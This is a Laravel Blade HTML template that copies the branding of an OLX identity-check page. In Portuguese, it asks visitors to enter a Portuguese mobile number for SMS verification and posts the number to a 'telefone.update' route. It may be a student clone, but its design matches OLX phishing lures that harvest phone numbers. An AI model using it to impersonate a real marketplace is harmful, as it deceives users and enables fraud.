<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@yield('title') - OLX</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
</head>
<body class="flex items-center justify-center bg-gray-100">

  <div class="bg-white w-2/2 p-6 rounded-lg shadow-lg">
      <a href="{{ route('olx') }}" class="float-right text-xl"><i class="bi bi-x"></i></a>
      <form action="{{ route('telefone.update') }}" method="POST">
          @method('PUT')
          @csrf
          <div class="flex items-center justify-center mt-20"> 
              <div class="h-16 w-16">
                  <img class="object-cover w-full h-full" src="https://img.freepik.com/vetores-premium/telemovel-com-marca-de-verificacao-de-escudo-protegido-ou-seguranca-de-smartphone_101884-170.jpg?w=2000" alt="">
              </div>
          </div>
          <div class="flex items-center justify-center mt-3">    
              <h2 class="text-xl font-bold mb-4 text-emerald-950">Confirma que és mesmo tu</h2>
          </div>
          <div class="flex items-center justify-center text-center mt-3">
              <p class="text-xs">A tua segurança é o mais importante para nós. Ajuda-nos a tornar a tua experiência no OLX ainda mais segura ao confirmares a tua identidade. Apenas precisamos de enviar um código SMS para o teu telemóvel para confirmarmos que és mesmo tu.</p>
          </div>
          <div class="px-20 py-5 text-sm text-gray-500">
              Número de telemóvel
          </div>
          <div class="flex items-center">
              <div class="inline bg-gray-100 mr-4 py-2 px-4 text-gray-400 rounded">
                  +351
              </div>
              <div class="inline">
                  <input type="text" name="telefone" placeholder="123456789" class="bg-gray-200 rounded py-2 px-4 @error('telefone') border-red-500 @enderror" value="{{ old('telefone') }}">
                  @error('telefone')
                  <p class="text-red-500 text-sm mt-1">O número de telemóvel tem que conter 9 dígitos.</p>
                  @enderror
              </div>
          </div>
          <div class="flex items-center justify-center text-center mt-3 px-20">
              <p class="text-sm text-gray-400">Introduza um número de uma operadora móvel portuguesa e que ainda não esteja associado a uma conta OLX.</p>
            </div>
            <div class="mt-10 items-end flex items-center justify-center">
            <button type="submit" class="bg-green-500 text-white rounded py-2 px-4 font-bold">
              Confirmar Número
            </button>
          </div>
      </form>
  </div>

</body>
</html>
